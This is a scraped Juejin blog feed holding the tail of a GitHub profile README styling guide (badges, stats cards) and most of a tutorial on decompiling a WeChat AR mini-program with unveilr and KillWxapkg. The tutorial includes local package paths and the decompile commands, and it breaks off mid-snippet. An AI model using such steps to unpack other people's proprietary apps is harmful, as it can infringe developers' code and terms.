<h2 data-id="heading-5">第三方社交平台数据的统计</h2>
<pre><code class="hljs language-java" lang="java">![github统计](https:<span class="hljs-comment">//stats.justsong.cn/api/github?username=ubrong&amp;amp;theme=dark&amp;amp;lang=zh-CN)</span>

![B站统计](https:<span class="hljs-comment">//stats.justsong.cn/api/bilibili/?id=1643462710&amp;amp;theme=dark)</span>
</code></pre>
<p><strong>支持平台与链接示例：</strong></p>
<p><strong>GitHub</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fgithub%3Fusername%3D%257Busername%3Astring%257D" target="_blank" title="https://stats.justsong.cn/api/github?username=%7Busername:string%7D" ref="nofollow noopener noreferrer">stats.justsong.cn/api/github?…</a></p>
<p><strong>知乎</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fzhihu%3Fusername%3D%257Busername%3Astring%257D" target="_blank" title="https://stats.justsong.cn/api/zhihu?username=%7Busername:string%7D" ref="nofollow noopener noreferrer">stats.justsong.cn/api/zhihu?u…</a></p>
<p><strong>B 站</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fbilibili%2F%3Fid%3D%257Buid%3Aint%257D" target="_blank" title="https://stats.justsong.cn/api/bilibili/?id=%7Buid:int%7D" ref="nofollow noopener noreferrer">stats.justsong.cn/api/bilibil…</a></p>
<p><strong>LeetCode 英文站</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fleetcode%2F%3Fusername%3D%257Busername%3Astring%257D" target="_blank" title="https://stats.justsong.cn/api/leetcode/?username=%7Busername:string%7D" ref="nofollow noopener noreferrer">stats.justsong.cn/api/leetcod…</a></p>
<p><strong>LeetCode 中文站</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fleetcode%3Fusername%3D%257Busername%3Astring%257D%26amp%3Bcn%3Dtrue" target="_blank" title="https://stats.justsong.cn/api/leetcode?username=%7Busername:string%7D&amp;amp;cn=true" ref="nofollow noopener noreferrer">stats.justsong.cn/api/leetcod…</a></p>
<p><strong>LeetCode 中文站英文站双修</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fleetcode%3Fusername%3D%257Busername%3Astring%257D%26amp%3B%3D%257Bcn_username%3Astring%257D" target="_blank" title="https://stats.justsong.cn/api/leetcode?username=%7Busername:string%7D&amp;amp;=%7Bcn_username:string%7D" ref="nofollow noopener noreferrer">stats.justsong.cn/api/leetcod…</a></p>
<p><strong>掘金</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fjuejin%3Fid%3D%257Buid%3Aint%257D" target="_blank" title="https://stats.justsong.cn/api/juejin?id=%7Buid:int%7D" ref="nofollow noopener noreferrer">stats.justsong.cn/api/juejin?…</a></p>
<p><strong>CSDN</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fcsdn%3Fid%3D%257Buid%3Astring%257D" target="_blank" title="https://stats.justsong.cn/api/csdn?id=%7Buid:string%7D" ref="nofollow noopener noreferrer">stats.justsong.cn/api/csdn?id…</a></p>
<p><strong>牛客</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstats.justsong.cn%2Fapi%2Fnowcoder%3Fid%3D%257Buid%3Aint%257D" target="_blank" title="https://stats.justsong.cn/api/nowcoder?id=%7Buid:int%7D" ref="nofollow noopener noreferrer">stats.justsong.cn/api/nowcode…</a></p>
<pre><code class="hljs language-java" lang="java">GitHub：https:<span class="hljs-comment">//stats.justsong.cn/api/github?username={username:string}</span>

知乎：https:<span class="hljs-comment">//stats.justsong.cn/api/zhihu?username={username:string}</span>

B 站：https:<span class="hljs-comment">//stats.justsong.cn/api/bilibili/?id={uid:int}</span>

LeetCode 英文站：https:<span class="hljs-comment">//stats.justsong.cn/api/leetcode/?username={username:string}</span>

LeetCode 中文站：https:<span class="hljs-comment">//stats.justsong.cn/api/leetcode?username={username:string}&amp;amp;cn=true</span>

LeetCode 中文站英文站双修：https:<span class="hljs-comment">//stats.justsong.cn/api/leetcode?username={username:string}&amp;amp;={cn_username:string}</span>

掘金：https:<span class="hljs-comment">//stats.justsong.cn/api/juejin?id={uid:int}</span>

CSDN：https:<span class="hljs-comment">//stats.justsong.cn/api/csdn?id={uid:string}</span>

牛客：https:<span class="hljs-comment">//stats.justsong.cn/api/nowcoder?id={uid:int}</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d81ca6db1814f9796765ed9a3171072~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=eqvcIaFSwIS2LtF%2FwRGp7rL0SS8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">统计访问次数</h2>
<pre><code class="hljs language-java" lang="java">![Visitor Count](https:<span class="hljs-comment">//profile-counter.glitch.me/{ubrong}/count.svg)</span>
</code></pre>
<p>说明：</p>
<p>{ubrong}替换为自己的标记，建议使用 github用户名。注意这个值可以是任意的，因为它仅是一个标记。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0c6b05ab2234c31add6b97407456bda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=qnesy6luWlzKMlB2gbcPQr56gvA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">徽标</h2>
<pre><code class="hljs language-java" lang="java">![tip](https:<span class="hljs-comment">//badgen.net/badge/php/8.1/orange?icon=php)</span>

![tip](https:<span class="hljs-comment">//badgen.net/badge/python/3.1.6/green?icon=packagephobia)</span>
</code></pre>
<p>**badgen **的 url 格式说明：</p>
<pre><code class="hljs language-java" lang="java">https:<span class="hljs-comment">//badgen.net/badge/{subject}/{status}/{color}?icon=github</span>
</code></pre>
<p><strong>subject</strong> (string) 徽标左侧文字，如：node</p>
<p><strong>status</strong> (string) 徽标右侧文案，如：16.0.1</p>
<p><strong>color</strong> (string) 徽标右侧背景色，如：red,green等</p>
<p><strong>icon</strong> (string) 图标，如：git,github,wiki等<br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c07722f0444f4194b437c47a78860840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=0bNxK33aYvNmVpT%2BADyTEwd5E98%3D" alt="" loading="lazy"/></p>
<p>或者：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5a4f0adf14645f3ba42c7dc5afb6810~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=gVmmsaFLgMKIiuAVQhIIOjyaml4%3D" alt="" loading="lazy"/></p>
<p>如下表示居中：</p>
<pre><code class="hljs language-java" lang="java">&lt;div id=<span class="hljs-string">"title"</span> align=center&gt;
&lt;div&gt;
</code></pre>
<p><strong>如下的图标操作是可以点击链接跳转的</strong></p>
<pre><code class="hljs language-java" lang="java">
如下的图标操作是可以点击链接跳转的
[![CSDN](https:<span class="hljs-comment">//img.shields.io/badge/CSDN博客地址-RainbowSea15-red)](https://blog.csdn.net/weixin_61635597?spm=1010.2135.3001.5343)</span>

[![掘金](https:<span class="hljs-comment">//img.shields.io/badge/掘金博客地址-RainbowSea-blue)](https://juejin.cn/creator/home)</span>

[![Gitee](https:<span class="hljs-comment">//img.shields.io/badge/Gitee地址-RainbowSea-yello)](https://gitee.com/Rainbow--Sea)</span>


</code></pre>
<h2 data-id="heading-8">我的 Github 主页 Version1.0</h2>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## Rainbow Sea 🌈🌈🌈</span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"title"</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span></span>

如下的图标操作是可以点击链接跳转的
[<span class="hljs-string">![CSDN</span>](<span class="hljs-link">https://img.shields.io/badge/CSDN博客地址-RainbowSea15-red</span>)](<span class="hljs-link">https://blog.csdn.net/weixin_61635597?spm=1010.2135.3001.5343</span>)

[<span class="hljs-string">![掘金</span>](<span class="hljs-link">https://img.shields.io/badge/掘金博客地址-RainbowSea-blue</span>)](<span class="hljs-link">https://juejin.cn/creator/home</span>)

[<span class="hljs-string">![Gitee</span>](<span class="hljs-link">https://img.shields.io/badge/Gitee地址-RainbowSea-yello</span>)](<span class="hljs-link">https://gitee.com/Rainbow--Sea</span>)


![](<span class="hljs-link">https://img.shields.io/badge/主修-Java-orange</span>) 


![](<span class="hljs-link">https://img.shields.io/badge/性格-开朗-red</span>) 
![](<span class="hljs-link">https://img.shields.io/badge/爱好-二次元-red</span>)





![<span class="hljs-string">CSDN统计</span>](<span class="hljs-link">https://stats.justsong.cn/api/csdn?id=weixin_61635597&amp;amp;theme=default&amp;amp;lang=zh-CN</span>)

![<span class="hljs-string">掘金统计</span>](<span class="hljs-link">https://stats.justsong.cn/api/juejin?id=752533564566951&amp;amp;theme=default&amp;amp;lang=zh-CN</span>)


![<span class="hljs-string">GitHub账户信息统计</span>](<span class="hljs-link">https://github-stats.ubrong.com/api?username=China-Rainbow-sea&amp;amp;show_icons=true&amp;amp;theme=default</span>)


![<span class="hljs-string">GitHub账户最常用语言</span>](<span class="hljs-link">https://github-stats.ubrong.com/api/top-langs/?username=China-Rainbow-sea&amp;amp;layout=compact&amp;amp;theme=default</span>)


<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
</code></pre>
<h2 data-id="heading-9">我的 Github 主页 Version2.0</h2>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## Rainbow Sea 🌈🌈🌈</span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"title"</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span></span>

[<span class="hljs-string">![CSDN</span>](<span class="hljs-link">https://img.shields.io/badge/CSDN博客地址-RainbowSea15-red</span>)](<span class="hljs-link">https://blog.csdn.net/weixin_61635597?spm=1010.2135.3001.5343</span>)

[<span class="hljs-string">![掘金</span>](<span class="hljs-link">https://img.shields.io/badge/掘金博客地址-RainbowSea-blue</span>)](<span class="hljs-link">https://juejin.cn/creator/home</span>)

[<span class="hljs-string">![Gitee</span>](<span class="hljs-link">https://img.shields.io/badge/Gitee地址-RainbowSea-yello</span>)](<span class="hljs-link">https://gitee.com/Rainbow--Sea</span>)


![](<span class="hljs-link">https://img.shields.io/badge/主修-Java-orange</span>) 


![](<span class="hljs-link">https://img.shields.io/badge/性格-开朗-red</span>) 
![](<span class="hljs-link">https://img.shields.io/badge/爱好-二次元-red</span>)



| ![<span class="hljs-string">CSDN统计</span>](<span class="hljs-link">https://stats.justsong.cn/api/csdn?id=weixin_61635597&amp;amp;theme=default&amp;amp;lang=zh-CN</span>) | ![<span class="hljs-string">掘金统计</span>](<span class="hljs-link">https://stats.justsong.cn/api/juejin?id=752533564566951&amp;amp;theme=default&amp;amp;lang=zh-CN</span>) |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![<span class="hljs-string">GitHub账户信息统计</span>](<span class="hljs-link">https://github-stats.ubrong.com/api?username=China-Rainbow-sea&amp;amp;show_icons=true&amp;amp;theme=default</span>) | ![<span class="hljs-string">GitHub账户最常用语言</span>](<span class="hljs-link">https://github-stats.ubrong.com/api/top-langs/?username=China-Rainbow-sea&amp;amp;layout=compact&amp;amp;theme=default</span>) |

<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d095d49f4f7d443c910b602617a1d220~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=mqfOafhPHvZ2O5BM9n1U4E6u7iE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">最后：</h2>
<blockquote>
<p>“在这个最后的篇章中，我要表达我对每一位读者的感激之情。你们的关注和回复是我创作的动力源泉，我从你们身上吸取了无尽的灵感与勇气。我会将你们的鼓励留在心底，继续在其他的领域奋斗。感谢你们，我们总会在某个时刻再次相遇。”</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76b18cc02857423685080459071b5657~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmFpbmJvd1NlYQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765633424&amp;x-signature=fM6RoQPLHTlyDQpcLVL98TFN%2Bmc%3D" alt="在这里插入图片描述" loading="lazy"/></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[玩转小程序AR-实战篇]]></title>    <link>https://juejin.cn/post/7580285196693045248</link>    <guid>https://juejin.cn/post/7580285196693045248</guid>    <pubDate>2025-12-06T12:15:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580285196693045248" data-draft-id="7579961957221908507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="玩转小程序AR-实战篇"/> <meta itemprop="keywords" content="微信小程序,WebVR,前端"/> <meta itemprop="datePublished" content="2025-12-06T12:15:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="深红"/> <meta itemprop="url" content="https://juejin.cn/user/4353721773338807"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            玩转小程序AR-实战篇
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4353721773338807/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    深红
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T12:15:27.000Z" title="Sat Dec 06 2025 12:15:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>《玩转小程序AR》系列教程</p>
<ul>
<li><a href="https://juejin.cn/post/7579961957221777435" target="_blank" title="https://juejin.cn/post/7579961957221777435">玩转小程序AR-基础篇</a></li>
<li><a href="https://juejin.cn/spost/7580285196693045248" target="_blank" title="https://juejin.cn/spost/7580285196693045248"><strong>玩转小程序AR-实战篇</strong></a></li>
</ul>
<p><strong>声明：</strong>
<strong>本文所载内容仅限于学习交流之目的。所有抓包内容、敏感网址及数据接口均已进行脱敏处理，严禁将其用于商业或非法用途。任何因此产生的后果，作者不承担任何责任。若涉及侵权，请及时联系作者以便立即删除。</strong></p>
<h2 data-id="heading-0">逆向小程序</h2>
<p>接着前文: <a href="https://juejin.cn/spost/7579961957221777435" target="_blank" title="https://juejin.cn/spost/7579961957221777435">《玩转小程序AR-基础篇》</a>，体验过原神官方AR小程序后，我也比较好奇他们实现AR Live2d 动画的原理。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3919e414bb774a31a48c104cacfad369~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=trFF3khGDWyUxbxqM2K872PgJQ0%3D" alt="123" loading="lazy"/></p>
<p>出于<strong>技术学习</strong>的目的，在开源社区搜寻微信小程序反编译工具，发现 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FAckites%2FKillWxapkg" target="_blank" title="https://github.com/Ackites/KillWxapkg" ref="nofollow noopener noreferrer">KillWxapkg</a> 和  <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbroken5%2Funveilr" target="_blank" title="https://github.com/broken5/unveilr" ref="nofollow noopener noreferrer">unveilr</a> 暂时仍可使用</p>
<h3 data-id="heading-1">逆向 某神AR 小程序</h3>
<p>首先我们需要找到某神AR微信小程序的本地小程序包地址</p>
<p>注意：本人电脑 Mac (Windows电脑同理)</p>
<ol>
<li>进入电脑微信小程序目录</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Mac 目录地址</span>
<span class="hljs-built_in">cd</span> /Users/你的电脑用户名/Library/Containers/com.tencent.xinWeChat/Data/Documents/app_data/radium/Applet/packages

<span class="hljs-comment"># Windows 目录地址</span>
<span class="hljs-built_in">cd</span> C:\Users\你的电脑用户名\AppData\Roaming\Tencent\xwechat\radium\Applet\packages


<span class="hljs-comment"># 打开文件夹</span>
open .
</code></pre>
<p>如果发现目录下有较多文件夹，建议先把所有的文件夹都删除，为后续定位要逆向的小程序做好准备</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caca688cc50240c2bed951b62e151865~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=5CUPMxsmSwKJXCxhzB5CU527DY8%3D" alt="screenshot-20251125-212338.png" loading="lazy"/></p>
<ol start="2">
<li>用电脑微信打开需要逆向的小程序</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c33c5ee3ec874fb0b66eaf004ded7055~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=z83TvgKd3TVFAeS0hEUjpQMJ4no%3D" alt="screenshot-20251125-211252.png" loading="lazy"/></p>
<ol start="3">
<li>再次打开微信小程序目录</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a41cbcd5c81c49209cd69149b2985992~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=ev1LRHbTCI9hSnQhblzskirZQGo%3D" alt="screenshot-20251125-213047.png" loading="lazy"/></p>
<p>这时候，恭喜你已经定位到了小程序的AppID了！</p>
<ol start="4">
<li>反编译小程序</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1baeeb8f5220408aa9e6d18e6ac0d866~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=SQoN70MdnLocdIT9Y%2Fxp7LsOQPc%3D" alt="screenshot-20251125-213556.png" loading="lazy"/></p>
<p>小程序文件夹下的<code>__APP__.wxapkg</code>就是编译后的小程序，现在我们需要使用工具反编译它了</p>
<ul>
<li><strong>unveilr 工具</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbroken5%2Funveilr" target="_blank" title="https://github.com/broken5/unveilr" ref="nofollow noopener noreferrer">安装地址</a></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装反编译工具</span>
npm i unveilr -g

<span class="hljs-comment"># 运行反编译命令</span>
unveilr wx -i wxb2618d769d6f5143  <span class="hljs-string">"/Users/你的电脑用户名/Library/Containers/com.tencent.xinWeChat/Data/Documents/app_data/radium/Applet/packages/wxb2618d769d6f5143/3/__APP__.wxapkg"</span> -f
</code></pre>
<ul>
<li><strong>KillWxapkg 工具</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FAckites%2FKillWxapkg" target="_blank" title="https://github.com/Ackites/KillWxapkg" ref="nofollow noopener noreferrer">安装地址</a></p>
<pre><code class="hljs language-bash" lang="bash">./KillWxapkg -<span class="hljs-built_in">id</span>=<span class="hljs-string">"wxb2618d769d6f5143"</span> -<span class="hljs-keyword">in</span>=<span class="hljs-string">"/Users/你的电脑用户名/Library/Containers/com.tencent.xinWeChat/Data/Documents/app_data/radium/Applet/packages/wxb2618d769d6f5143/3"</span>  -restore
</code></pre>
<p>于是在小程序文件夹下，就新生成了一个反编译后的源码文件夹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cffe07650a848d09159615ad355184c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=Cr4mTEcn0XIPn%2F2JVQiYTnJHQoE%3D" alt="screenshot-20251125-214601.png" loading="lazy"/></p>
<p>当然，反编译后的源码也不是100%还原：</p>
<ul>
<li>缺失 <code>wxml</code></li>
<li><code>js</code> 代码被<code>babel</code>转码后，语义不是特别清晰</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1317892021234adb82587d59ba8101a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=V4%2FF00HkR9xooYr4KNfxgmeoPyM%3D" alt="screenshot-20251201-195547.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd00aed847624c3baf35b657cd65e3e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=fw7SBhJpmXj2WVArLyzm5vfnkMM%3D" alt="screenshot-20251201-200158.png" loading="lazy"/></p>
<p>当然，在<code>AI</code>的加持下，如今这些问题已经完全难不倒我们了。<code>AI</code>分分钟就能根据混淆过的<code>js</code>原始逻辑，还原清晰可读的语义化代码</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c804d2e26dd4af590551fb1f23c7c34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765628355&amp;x-signature=Piokgi8Tiw43vBrFbUsPtvkokLo%3D" alt="screenshot-20251201-200736.png" loading="lazy"/></p>
<p>从源码中可以看到，原神AR小程序使用的正是<code>XR-FRAME</code>框架</p>
<h3 data-id="heading-2">逆向 某cube 小程序插件</h3>
<p>官方提供的<code>kivicube</code>插件</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"usingComponents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
